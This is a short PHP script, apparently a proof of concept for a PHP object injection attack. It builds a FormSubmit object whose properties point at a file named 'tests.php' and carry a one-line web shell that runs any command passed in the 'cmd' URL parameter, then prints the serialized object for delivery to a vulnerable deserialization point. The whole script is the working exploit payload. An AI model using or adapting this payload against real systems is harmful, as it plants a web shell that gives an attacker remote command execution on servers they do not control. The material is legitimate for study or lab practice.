<?php
class FormSubmit{
        public $form_file = 'tests.php';
        public $message = '<?php system($_GET["cmd"]); ?>';
}
$obj = new FormSubmit();
echo serialize($obj);
?>
